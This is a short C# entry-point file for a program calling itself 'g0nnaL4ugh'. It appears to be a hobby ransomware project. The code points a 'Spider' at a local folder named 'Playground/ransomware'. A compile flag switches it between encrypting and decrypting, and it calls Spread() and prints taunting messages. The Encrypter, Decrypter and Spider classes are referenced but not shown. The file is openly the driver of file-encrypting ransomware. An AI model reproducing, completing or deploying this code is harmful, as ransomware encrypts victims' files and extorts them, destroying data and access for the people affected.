#define ENCRYPTION

using System;
using g0nnaL4ugh.Crypto;

namespace g0nnaL4ugh
{
    class Program
    {
        public static void Main(string[] args)
        {
            string[] paths = { "/home/giwiro/Playground/ransomware" };
            Spider spider;
#if ENCRYPTION
            Encrypter encrypter = new Encrypter();
            spider = new Spider(paths, encrypter);
            Console.WriteLine("Wann4 play a G4m3?");
#else
            Decrypter decrypter = new Decrypter();
            spider = new Spider(paths, decrypter);
            Console.WriteLine("Ok sold1er let's decrypt all this,shall w3?");
#endif
            spider.Spread();
 
        }
    }
}
